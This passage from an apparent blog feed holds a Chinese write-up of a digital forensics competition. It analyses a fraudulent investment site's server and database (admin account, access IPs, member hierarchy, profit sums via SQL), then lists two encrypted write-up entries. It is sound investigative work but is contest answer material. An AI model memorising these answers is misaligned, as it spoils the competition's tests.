src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829202739130.png" alt="image-20230829202739130"></p><h2 id="【服务器取证】请给出涉案网站后台启用的超级管理员-答题格式-abc"><a href="#【服务器取证】请给出涉案网站后台启用的超级管理员-答题格式-abc" class="headerlink" title="【服务器取证】请给出涉案网站后台启用的超级管理员?[答题格式:abc]"></a>【服务器取证】请给出涉案网站后台启用的超级管理员?[答题格式:abc]</h2><p>这边看到有两个超级管理员，但是admin是启用状态，因此我站admin</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829202754177.png" alt="image-20230829202754177"></p><h2 id="【服务器取证】投资项目“贵州六盘水市风力发电基建工程”的日化收益为？-答题格式-1-00"><a href="#【服务器取证】投资项目“贵州六盘水市风力发电基建工程”的日化收益为？-答题格式-1-00" class="headerlink" title="【服务器取证】投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]"></a>【服务器取证】投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829202857236.png" alt="image-20230829202857236"></p><h2 id="服务器取证】最早访问涉案网站后台的IP地址为-答题格式-8-8-8-8"><a href="#服务器取证】最早访问涉案网站后台的IP地址为-答题格式-8-8-8-8" class="headerlink" title="[服务器取证】最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]"></a>[服务器取证】最早访问涉案网站后台的IP地址为[答题格式:8.8.8.8]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829202939370.png" alt="image-20230829202939370"></p><h2 id="【服务器取证】分析涉案网站数据库或者后台VIP2的会员有多少个-答案格式-100"><a href="#【服务器取证】分析涉案网站数据库或者后台VIP2的会员有多少个-答案格式-100" class="headerlink" title="【服务器取证】分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]"></a>【服务器取证】分析涉案网站数据库或者后台VIP2的会员有多少个[答案格式:100]</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829203022133.png" alt="image-20230829203022133"></p><p>当然用火眼的数据库分析工具也可以导出member表查看level为3的用户</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830100329493.png" alt="image-20230830100329493"></p><h2 id="【服务器取证】分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为-答题格式-8"><a href="#【服务器取证】分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为-答题格式-8" class="headerlink" title="【服务器取证】分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]"></a>【服务器取证】分析涉案网站数据库的用户表中账户余额大于零且银行卡开户行归属于上海市的潜在受害人的数量为[答题格式:8]</h2><p>走ssh隧道连接navicat，然后根据条件数据库语句查询</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829203836399.png" alt="image-20230829203836399"></p><h2 id="【服务器取证】分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？-答题格式-10000-00"><a href="#【服务器取证】分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？-答题格式-10000-00" class="headerlink" title="【服务器取证】分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]"></a>【服务器取证】分析涉案网站数据库或者后台，统计嫌疑人的下线成功提现多少钱？[答题格式:10000.00]</h2><p>这道题比赛的时候队友算对了，但是没看清楚格式，稍微有点可惜，但是如果能重构起网站将相当直观</p><p>其实没重构起网站恢复出来数据库也是可以做后面的题目的，但是个人感觉会比较难算</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230829203918649.png" alt="image-20230829203918649"></p><h2 id="【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？-答题格式-123"><a href="#【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？-答题格式-123" class="headerlink" title="【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]"></a>【服务器取证】分析涉案网站数据库或者后台受害人上线在平台内共有下线多少人？[答题格式:123]</h2><p>据题，受害者为陈昊民</p><p>看一下推荐人</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830101800936.png" alt="image-20230830101800936"></p><p>然后直接excel看</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830101828375.png" alt="image-20230830101828375"></p><p>inviter为513935的共有17个即17个下线</p><h2 id="【服务器取证】分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？-答题格式-10"><a href="#【服务器取证】分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？-答题格式-10" class="headerlink" title="【服务器取证】分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]"></a>【服务器取证】分析涉案网站数据库或者后台网站内下线大于2的代理有多少个？[答题格式:10]</h2><p>先把member表中inviter这一列的数据导出</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830102207289.png" alt="image-20230830102207289"></p><p>然后统计一下大于2的个数</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830102301724.png" alt="image-20230830102301724"></p><p>那么就是60个</p><h2 id="【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为-答题格式-张三"><a href="#【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为-答题格式-张三" class="headerlink" title="【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]"></a>【服务器取证】分析涉案网站数据库或者后台网站内下线最多的代理真实名字为[答题格式:张三]</h2><p>这边看到inviter号为617624</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830102359939.png" alt="image-20230830102359939"></p><p>我们直接在member表里看一下invicode为617624的是谁</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830103238605.png" alt="image-20230830103238605"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830103248648.png" alt="image-20230830103248648"></p><p>总而言之就是你可以有上线，上线为inviter，也可以发展下线，那么你自己也会有一个邀请号码，即invicode</p><h2 id="【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱-答题格式-10-000-00"><a href="#【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱-答题格式-10-000-00" class="headerlink" title="【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00"></a>【服务器取证】分析涉案网站数据库或者后台流水明细，本网站总共盈利多少钱[答题格式:10,000.00</h2><p>导出moneylog表格</p><p>然后根据加减号开始算</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT sum(moneylog_money) FROM moneylog WHERE moneylog_status=&#x27;+&#x27;</span><br><span class="line">SELECT sum(moneylog_money) FROM moneylog WHERE moneylog_status=&#x27;-&#x27;</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830112225565.png" alt="image-20230830112225565"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830112243544.png" alt="image-20230830112243544"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830113322246.png" alt="image-20230830113322246"></p><p>这里我原本的做法是用excel表格计算的，但答案不对，不懂为啥。。。</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830113410477.png" alt="image-20230830113410477"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20230830113426089.png" alt="image-20230830113426089"></p><blockquote><p>ps：半决赛wp请移步我的<a href="https://blog.csdn.net/weixin_54448259/article/details/133546457?spm=1001.2014.3001.5501">csdn</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021FIC电子取证竞赛题解</title>
      <link href="/2023/08/19/21fic/"/>
      <url>/2023/08/19/21fic/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="af6c7ca322043d3b25d3a823838506595d593e65c72465c0e0e4087f98718c58"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-up">      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-up">请联系管理员</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020FIC电子取证竞赛题解</title>
      <link href="/2023/08/17/20fic/"/>
      <url>/2023/08/17/20fic/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="a8b78a9af471d62f5f13c88ba178094acb0e8be7954a4187cfa862ca9021d539">6c0240ebbcf5c93486580d66072e65d6fff2426090125f74411f0ba03ea2f225fd59734da9bb9d1cf0f90ed3906c964b87b616cc039ae1003e563157bff472f85e8093c5a7b128784195e84527b8352299a5381bd633e81e9d87706638723cf9bd48b70541ec1925dcc36a1e5a7c1f89b8666de620ace1dcd6c22470f6112ead6ddaff7e34d27f8bf51b7a1a24977b463ef8c7a751b9cfb4c93fe8926baf45fa93a4cbeff7d440abaa2a0f0ad04da0d582e176ce4f885b1ee30cf8ea4c08222afac7b9eb9614ff1d16d260f3444c5acd6132909a62a2d5cd2c7849f643890437baa515eb01bc275a531992204f3edca50db9b0c7466ce21255e338a9ded81db2050f2ba4de3e90619d1a86c87751af48d1b3863560d95d7b4f1db0ecc4c38cdb063de8df393b8c38e91383e362acf487f489f332dbba1810bc2d4c4b76e08870439a044348fb15ca01e519c73b5d8e56d691296a41ba5fdd4854fa9e956c3541d02babb2021c3582adb234dbc5e57091912632e8a5421d17a8b551ca350a0013f6b177fdfd3b0358cfdbb1633703fc2ddbc4fceb7150e45e0c8a0885079e717f52374d277aee776ed016f136574e4888e094480006824255bd8473df236a975558d3c669d8f2fa28ef7d8fa65d7c9adf6249a48fba764395d487ffb18de7254a4d119860c6d88a7e64e0b1c37afc7ffe311e045eb3d8d37270795baa27be3e052f9ee42626b10b6d632dfc8ec51d50de0b2e68b2058e94e055ac794c1a3d86b515fc0c67699da9205c7e8855737a72e170277bc040639064f64c444855a6a1f4e92c673744fbea81630a6382aa0fdde94cb7ba64f912e0288f941715e8efcba15d6ce678b13992550f38b595d056bf257b9caf46fc4a1aa7eee5ca7eb6b40834b79264f0153a1be74b1bc3dd2ae5f588bcfe358df02ceb3af2465921d9d18e30da2864477f46dd333197b6c9701181ea1806e5b9ea968d1608de62c899e2bca4060f6c65ad80bac3490cddaceb896c828ece7d9b81d68a67da9d0a103631f4e82cc0f8b2192ebbadf78fa75d2c2a9989cea2787c933be5b22d8791c29a4a0d664bee60c01b023d6ecdfd14f3a5ad97cc1bd95dd57f51c845e29b5b270c9ac9d1b7e01c9467c9a9b330d0fea98aac85c32616f4ac4bc4624d6223ad209e2eb34d831ea9ed6d70a203c9fb4000223cc00adb99bf7707baf040a2641a760ffa49945e956d63684f7800f2bd56a88e2fec32ab881e081a60b8f0350cb9cf902c5beeb711726eb62e056e74b6c1bad55cd7070a568c56851fff751135fd6b2f874ea5f4944bf7f4dda5ce6fe815177833e6f0f6edc493cdb61436a2d8d7971857cad0ff42c172ed04b1d258c1e7eacbb462f4459f8dab2b16259a3d2fc87834a13442e2390424deec4d0ea07232a727252fb8f0689d977cd0f98beba0f635d0d3b5134e376770ae3fa4463410f4bb464cee2700d60d203cf5bd800c53d1bbcae95a83bdd4f17fb7f31f11c1bceffd6dbf5ad171698e00ddc69c083b4daa82b0d7e956c4e539d930672f1bc78660cec4b3603c5505a8ea71c44dfe66202fbc16a136e07b30bc19f4675040af0a2af33eb786357cf8ba129041a7ae91fe7902d3f9c814d48fca862fc6c6f376f5c8093d4ff9aa38ca623ccc257f72c6f2848476820e9412fbbef31efb5918597eb2d5004aa1ca4a106bcafdf954048369c5db1e32adbea0def6f54215402a5a817ac19018489c3844a9acd752a0eda7526500d72e61929b87e4fa0cc98c4941d8744d28b68f560227520b3a005d35e555ff42f877d64e30b5e05a68cf9137a0947c1183958cb6f882bba8d36db53f6b6ed470d307e97d13d171d14ce3e6bf47f7da6b909b5ed288e2892cf064be87357b0c90660fac8c1a0ccffecb26dd270c69f510d1ceaa9f7525d386ee8e42254aedc4c957ef34fdf025c4f7f353ef1bc3059057a8b3eb80c8a55218256aeda6670658af9c793bebad65336721f53768ae60e7560bfc704b060c64384687cd69b54fbf5c7ec7f037bfab3728d3e5ae1c8fde014974a5f7e93f391fedb0f77f9354ae0c98d838033ab8a0d82bda1c488e55c26e9528daba160fa40d508b57c8810c2afef09f91edd42a41adf81369dd4abc538a37c324577ed462affed8465f705a4ca8f0fbddd9227e23e7e02f9f0e09a0e8b244a5eb536cfab1c70658b1f072048c6f73e8e4c18915e9eb947d3e21495f609517a46509494b28ac0fd50b2c88f0b0c924b3f7a03818fb3cd833f9469e5c8741afd2dcdce55f5eb4aeccdadcee17309312347cd2d09ee61c7c87e94c2d8b8446a90a31bcfda1a522fe94bad015d54b469ca3755cc7e4c2ac69c28a014d384a3540464681d091b069cf465143bfc04b248039d6348bc13e31b8ebe1a7974edeebb8c0a0baca36278757b0e7da322c223fae5b11b430dd4ce7c4c8c4d2f862f452a9444198f29d479f558b637b9f9eb97637ca5618280de65eb60ce4cd015e6eaf53cc9385b64e43f2759c21b349c1ca24af2354283da02336d73855de1c57692680f1f84ab66fda514dfa3f7d11cc8e77660a76587ebd234c92d948d080dc28b75b907c9ba79b491500da26a5d30c8754ba5ae55e4e44d33a73d2634e927620987c8c478cddc9f301114b911662434acc8c4de1e252fe6c60e6723aa1014d38f4c2bdb7ff9b7626fc913bcadda54f5487ed4573096ad41559b15886fbf7212531b8886c9c16e0b72ac5cec5263269f32632224b6f0fbbbcdd920c782feb6cdcc2520e00d39c92368b4740c61f503811e7f30e673d2342fa3ebdd135d3b59ad09f34ac2eb8fe657ea9a5e743983abb9b5b60b148ced7247abd425694b9c9d032ae22593d8f853939a981b42598412d7e35518f3ba5a0f10fe179f6dbe2fcd6b883e2ff92f2f6c7868ef93dd478c40f00e83948d2b76caef58dd4443138e0b308decbcb7f610390f2126878f189e175f65fca400015b3a60c09135ccf3c7605f980c8fa6fee1303c2d80f0a246297d6917bbb37eeb047b448989e108da2249b130c2bfdc14dd4dc91e0892ef08919e5c4cb60db79d5f9a06bf62184d01a7ce12eb24ddbca9be382c308d4c75a87438cd492c23dc6eccbe665f2bb296b51c27599ba5b7aa80105873f7748b4daf10154c1107d7af08e650011abd446f65505109069604751edc8d172906f09e1e46936247b80b84880ce5072d12c936d38a67a4e1cf526ad64a3e7df97aa5fde75e940940dc274108971b68b4c6f8f39b35d3c48fd185344a0285cd18fea72531ec5050d9f5357d18f7fc3f3ff91973e95c02fb3d6900d16a8ad20bfe7057f98e1a518f7048e7f690bdd3473b685f5fa5d6288684a4462e54c0818587a50e8f82f43da06e4ab54fa3a08b5158773f166aa743b34f1297e3db018262454f896dde10e11b3da5f7b29628d0c70d6666c73e176ca0c5bdfd10d36ef0b40c0bb8cabe71486337d2c908c4c6d93da42debbed297f96572b7af68256466d101ca187586e8ca5f22c2530cb530b9d58d9b5919c22b2e1627c4017a21278370ed4532674686759df1e2df907e698ca87e77c737f6689a22e81f4f390eeaa0cb6e9980adc04dff1753cdfc3e5be555cd75c758346484acbd386466d74710bd604b373dffbf154ce4b6844617633724f8e0351186930d1d785f3b9c9c0e1a86c049a09b8e59457f27692ef4e4c77b0ed2cf8efa9fbf7fc2546dc1df8afa36c64c1a441aff6595b972eb52713335630fc9f11420b790f91ab58cead73fe36c678af0f8edda200102c3a038a534e7ca1f491d0b05c6bb66592757a1861c96dc98b962d8ca41c5c21027298a9b0b97d5c22fefb70ceaae981cc09e24a9ca52970723a0ecb3f59909687aed1470db6c1ef2353ede70add06fc22f9d22bf8416da2f0a86fc648c746396457f8ddf8fe82558ea5b3f2cd89a4161fbf00335375c75659ddf6fcfd3a50c897f32799e98ea538164b356282f9a6ffe14b15d896f9e3a55a1d0c8f391b67c8f3b93607dfce3209034c374b059a42a2f5e9b579a25f7ad232515c9aabb8328d94feaa937a5a6d103d254691ee03428a9010132974f0241d94ebcb58548be0a82d003fb52efd8a033005f617bb47762e2f1677284c26b363b3de424ce1a65eef6bd4b6d204618da4d798e3283ab4f7657ea36e12e6f9c8071b28ef8013852fc260dd8eba55723a566591b0e787e87db90c1712352348fbf21a0dbb3f72ebb5785185f40e6ae0ccbfa363757e0950ced7a6f06fb3317dfd4f3136e4069ac79cf3eacd00d20faa4a424795db580456976aa221d64f4edd6d16020863c014349e3e4c234b9e58b02ba5b9afb247e5853ff9ee351607f3877e1b82988f76aaf2111591733f3e4d44419e51c43aae391a6f6af53648d6632f1dc2a3a05fb26cbb8b7b8e694c588da0843684b6ab5ccffa26b06fd5a01ca6dc2359cfaf6529319214544f35c04dc94c018a503727f91670d505fbdb9561d039966cafb0343d01375adad387e490ffe00dd108a3791391a7725137765e67e6d476f41a849811db9c1c3cb98fadcc9c6e6477e73208ba244fb704bfa4bf7729263ff589fc17c0bea4c1cff7ddd3d5b246ca9ec7a63656c2917c68f120ea7b71ad4b23883b1b53ea9914bb1432147398599a9d7eb942558e7e68ac8d247f0ef1c85f8bb3cec35804db5b0f51773dfe7ff4635314c89eec31e99dc67f8d76d586dbd34fffc54775bfbd3f394601af65229180c29acc99cfd6d7ceac54492d18e6f3143fefd4ec7c2ac59147910d7fd147e015594356a0d3239757d6564ef3176836bde06db0eb2de78bfba1e30082442d5c832f904c3b2cffc47abd9bdd5310a1eccc65fc2089a349c4af0a3765ea1f32a35d983b72d6866b3ace8eca1269e24f3b605f53a2c75112fd5e0ee7c7bb5bcdd3303a1c9fe63ae2fbf6affd57c0de9ea16df8144febd237cc2b6e5023b7e2d0c17f7f454bf3da3d398684ef38ea33361654ad9c5c801826345bc09b985dbc667339686b425f00160fdf9a9fb71526225dc14b5f5aea03729676be4fd0741e4c1112695fccd12a0752e1644b30007c0c9a0d38f871d7c56fea328e2a5fecbbb271b8ca62e085a8b5c011db5f2fbaf4e00d19ad46a0ea4a214a35e718bf64ca2fcec8150178f907f29c5644608194c10f53e2acc610520ffb938810035ae178ea54ebb49791e16ca486f8c4e9e3129df6a7e9dc58b1dde76be31ee594afc710b0f2c08ffb00a54b238e6e4bbd5507b222960c6e433eb69230e118e260fbdbcbdffcfe433978b4908ee8abdcde32d15b50b8b783d795bc21bd42c7598d25024ec99cb8cf84ec92f4191157a78b33365240d5a140598e58844ff80aad0add4404129605f41fc1977258c10049d15f2e88594a54a0718d1887cbdc585009404f223ac531c7b14da213cd6aa75ab7c8c688def37c9bc25461fe42e47f58a77f78158f6d4ce5d477200f800851280cf54e1f85546b2e65c5a9adb1549716ab773e81a0fe8c35647a680cee55e249f9faf0af6d59ea0efa7e7c20d044ce7ef29a25d84b7e0678a69df373c45d03e826daa5ea801c3002e1d95a25b95e1b64a20954316d3e438ef52f21f0f266df722be13497b37691d4bfdd142b941ec549f4c2a2c32fda2035e989fbbf668d7c27b7058acb68f4287b91be3cad697ab6b3ab1c6c3cc5a5b524022c59576348e7ac151f2facb9661e26539701f3f6117c5e8be2caf6cb322892a96d8139115b769599cf0a03ba4c4dd69dbb1dcc14b8fdd9cd1e2e3b003765bf4e602906668dcf0b42a1e4ef599cbb227b5ea08112707797200ff35be4e6b8f3d3dd8eb773ac3827a37e82cb942549d065b27a0785046695be38bca0c09d1d0d69a42d3481a99bf9375c7575442a0891e73520736114d5c29e75b824221be4c5fd3d3222a01ffb2244a0e69803ecec5ab799ac97c3f64a04c03d2dd3321fa19cb09dba204f3393bb93c00862796a53fe090f07e782e3bf59bafb15578cc118bd5ff1963398b58ffc2ee0cc85da5f74394b87bd2f9f097f702fde10136d31a3fdf38109c1704eb9eb02177dbea88924aa2a6431fa473ed7a972b67260cef4bb20f300cf77840f525d8b375a68e0522d8752cdba7a71c7ece614033466cd2580f6d64b0652b0567e0933e68d7200eb932421b1450b22d9d3ab9fc9bb1e6225ab50b3576ab5f016143c2accb00e342da2911c46995549b4e7060330327a8b61719b7db75e36d2f9528759df309578ac1194332186b2a375620c9189ff1060b1db46e1714d22470cd9837d77aab4c896ba92090aa27ca29b49368ed56a516f67a49b115b60ffb9ff315daa5e55f2fc005084d2f86c6395b82f899720e61600636171c81e0b11158b6f85ca69a6314b428f164fcbd72e4cffe124e40715813b22cbb2e71f2a42da4d5ca8f7428dfa41a0218529d44e6e3324e3a68abb07bc75a17ae7fa0ce2cdded5bd7339af794268ad69dd1bd745e85089ece13419c82cc6837737cd04db23810bad99b32f9f98dc82238d8c79f8d7b8b83cdcb0e914db602292c2ba6731a06c4657473d234eadb82a000e7ff73fd5395d559d9a316e0fd1447c668f955c3bc439dfff993ddd1fb84770ec089769f00009d604a0bbfc057a887eafe81401ff21d3b2e99ee6270d6a51e58cc79437785e17e7075532144ab25e624d6cc0f5907d00d3624672d62c53fb6b4da372bd738e6b342ba3de56c3ecfac167d577d340f5734a6c072f053fabf1aa7f02b84f5220f8205332f3966841526d89da33f006faa24d741353284f96e3fbbed8ab8c653d24d50841a134646ef0bcb2b06241d83be8097fc41b2c8523244f0f29ff2a4be79af55ce3ac89d1276f70c0452070eed6b85cf76d44162808c96cda5dc490221a62e230e897ea4dd1c83b1e7e939aa8466fb29988cf3a490b0e5bb338b43c18adf9e7d514d0d09035f8822075c872933064a3bbb1e834455a050995cdc59052bbe6c615ccbf21f25dbf047809211b441b18053ab3eef74ba2f9db86290f273b93bb9b9c310eef9b6297d47a0a009f3146bdf0b5c253633661dfb18960bc2190edd7182f5ba25f6cbf0936c574a3679d3178eba14173de7d84b717e908c89f279162885db4b53a49f01239603cb0633d0158c37b4b3801c963e085bd5cea33d2f07df6b45eb7f77e955c7329623deefd8e3d1030a6085c2f5a1e29e5e68d8d017d0c0b97b84ab8ae2fee45936163d358bf0920223bfcf3a8017255e1e068eb3eed4aaa3c7dfd350713d0287d1b675a18b53a5d18d691d2b41bab50e616b894365cac38ea2340fac6cc38909998ff0d8ddf79b8b870057f6ab2141e31e20dcaf71c25f3b5a4ef1fd6ba8d284b6bcdaeb4558711d11864b8b84ea093d50a40e6cbc5db0d90a039a96db2b0518350108fedbe138c0f1b1cea20093d1853ad28d62b57ebe8b5dc33d4e39b35b58b97cfd3fa62981dcb84f36da069fe59bc788ebe0304b09e703726a485d11d33722b119876e8d61b15fcb307ef71f8ade0cd31378ec702eabf8ee106d5d7fb8e1ef79de0517824daf84bca538a4a15f4e57c6045f425a1c6989846b2bfebfe1b197d6437315402112f09b6259e382b68aaab3ad1a5f80c0b8a6861f4b7ce571d9ea022add391616e952f1685d21133e0194f92ed74689a05943e3e0667f7dbad70099b186a0c5febc0e2a3e58d4536dd0aa3dee5db4e69713c35717c6523bfdf575280c3aa3524769ab31c26b2f553dfc63155afd3e75e8c22a25825a7e4d3a7fd23f59ec9445693ca2df5f3cc7df8a0ebeb768f969905c38ef93f8f1ff3e62e2d7f9064fe748f06a1da93e1ba8df51c0a6455634a151c6f1b0e6d4d58fb1b6b4bc701f019c3dded820899856baf44a1b5fd6c2013c16f6bb93573ec3c9b39bf67db4ee2df1f92d0dc203902bac0e457f362aab2fde90e25137c95a0513f04720141f63b102ab489b4ebe7a938496fc74578a24a87c4d7fa476421d2045fe336e644b9080cd84ba3bb5ebb14cc21f3c25ac6db402e0d88bde7f90e7930f15c6a79e08b0ea153159d9f2bc33eb5a04db9f66961eec83712ce5297eacfa8a9c4389f1b08f79ea2a3e8cecb1a9eccc7b1cf72a682b15b16b6928d379dee1a2574f7ce037de7398e8cf38e22114e2feb1e870806860537607fe26f02cb7073fce6c8a71130b665b5cde61b8c67ef0b17f60c040dcf78c1339c8499f8d20838a189586fa355b15ad875290c1d9c3ff3006905257c1aeb47663e1b8926e75d750e9f8c93b84f3c895ecac2918263df1fc60c309e09d9d91621599a4a4d5ed95fc799a6d55c6ce80ba42833d3a0bb7d5371a354100fafbcadb5f99fe4fd718e054b704ff7d0babb35020b434f9819bad11c884ff3f4578734f06ba811f30dd6c30f89bb283f7769b18dee2262f86fb57141db3df8eed840bef69ef6d9b729c1f1890e55582fd5d95d30432e0fb433d6a2758e5c621117c054786771c713e440871663c273793e9a92c5ada520cf501bcead7346fa08e63d2fdba50d45e9a106913eb57787872295ce0f2d67a0164bfc374e57c31a616c259a05f2ba907bf07e03d94ca2891b164f7e1fafb3b6f118bc12b2bf5e035093e6dbf8f803ea3e87ece587b535f179b6c2219f45a228fb550738fafeb5c439912156531565046a3baf6f38f4195ea0fa1e06d6f294ec6c2f2b9b67ba024f1b3a5fdc68d5bf6147ea6be4721da1e0917b7034ef93f85f4ccf03e92d48e49f7ba6cc4dc379b523fc96fdc573996acbf7c782d7c44543d1a7a412687d17f7bb9313bc37f895d2e8357571075cf67e68cfd60abb98a184959bb22b2163e6b75ab9da6e73ca2a59e1e56dfcf897ad5c96a1634b89cc83782e4753fb2860263c6c8a45dbefd32153af106e607cfe08cfc00412b373f5b0009c9196f910e088d18a5181960c079c13df238f87a0ef2638a047cef79b36aadd31538e2f4185e7a61e4465efac779e0b4192cc0a032776c50b730fe191c1aacc0b02f20162eebb85d2f20fdb3694cb2de727c639a8bc8da298ff78fd91f787f68fabbf23bfd1ab93c97954b3f86884ab77c526604ae409959a9fa5c29732acd350af08a1e42ba8dde99d4e7d3cfa389b0e32897b254b52054985611e9cee285ad5187f091c11db33499721ca72fe8ecb958106bc5f882f13df157cfaefc8b7b552930d6e6c960381bde3340a629cb6169995409e1e31c0d68e0162e897c13050034134befef241d354d40c98b886773311b92c9c38d3a0ddc2e823ae17533dceb5cc85e91fa04472f46046342f68d033d0821831f9b1d6ccc9a6262d2f38d01ec9fbf54d0d29d18e7fdbe4c6eed7f8f059c28a9ef862a65f0fbd772f061cdd34b10a01770f5f3078779638812e036f1f72f2fd0f16aa45a77596016494a1f1bb3509d6cddff4c65b237772648082d62851546d8b6b432c3a0926b71008f829c7535810e7b7b11021a2ed4294517812805c671c43884dd42306cc9c3758ecb64a963dd5e444dbe0b31cc02b36a2d19d14e3ae99728a0be0a21856cbd8daefcd1330e6a23bd1a01b26ee308825f910d6af6d8c4ff0f9eba894d2e0d994913617a12e0aa80b92ca9b916eb7b468034a4ef567b3a69df5018ff7b336cc452745d08cdd5ba58344598b26fa5ce6f79898025f313d1c2a86bb60d45813b70af853764b1c53ddf2d96c495061c98a85e86bb076fc1388ab2e588a642010985ca25859fc61f42e23e6445b3fe0c44fb2df21f70e573bddae0a1064c0ebdb2456affd7d747e88dd2ac0cc55386210e854d0bf9c8f8234f760178eba5609f79c782cefafd616bc3fc3e018655c8c37c47624456dfbc2864988d0425c71d06de6e9531f5fc998b06fd4569fce1c520835e9658c84c4d1ac2bc2efb5dbe9268c665515b975905c5a6456d67a58e0ea3ee01affc0ac5a0e53e59caf94569fc4ec178d2f45bb31f09390ddcc3db6e61207ec0db18923c8d4fd2b908d930be6101a9cfe8dbed49f77bcaf7874d6ab366a8cf2de473e2c013dfd65232131bc6c9233b803bd7543362192525f1d2ab6fc78d18aefd2d44b09598ea30a0e7376477b43883607ea780b80f8b7830b55cb69e8acbeb5a5376b9e5b860080b7118206a6f4b710a901cd51bdb82493c0647e56f5dabee87a20769858a2d8b219757727bccf0a2bc7ee077cfa656e810e06ccc341a95a94ab0c5f991566835296063cdf30eea26d06b65fbc9b3cfb262c42ec77c11ce29c7dccd3e93a0ad2f41ea92b3140a8b05458d811a8a37fdfd5a13b4c11e732196997b45d755d5b4b3d22bc7ddf0c5a36594d40eda94df2f70eb6ddf7f75b1fa35f1316bf49e3f0640b4e41d7461bc95e33882fb61fde7d066064430e98ed18dd9487c93f88ea20f3c1118d1000e90a32b23abec0a7f79192299a5d50391da8f746b824cd37113a9c31c08fa65b7efa0574417f135bb7a185a443823743223d1c0179d9e5c2ddadd85ca5df31fbdbf32e46e7a76c63664820c08142c2666d2b09994501f20fb1939578be8ae51d829460a0a1ad49360149ba6c18c5acf856d89903621e08a24a7e90ac6d2a0801ecfb8dc17d670ac4a949623f5cf2661dde313d85f07a19a16a3ff7df1ba68964e9fda27992b230b690931bb9a2dd1b9649d873ef0b04e0cf8de4b02b9f664178fcb7a6726f1d9ca7c832f9fde1327165a20ff0b28b8cdb3dcdf2d89e873eb3ddfea5f2da9589aeb1fe1b6f7e4059657c8be37e5f1695b7463292bc048317ef4b118c835d469c18fbef3969251a336288542fdc3fa6e1fbc62a16055d6b891119a452edbd1ea08febe9a2120576d8e11acc97a740ba0d7d44b07bf52c408c2c1de213884ebbb83d80d20745172c09923757b92599f3d793d9c0900e0f462318ec2fdc1dfafe45813a3dd77dc0baeb9703c4519b8fc99ff48f357754e1eb39829cf9a083cc9ed728f95413a8b1acb16a8f6b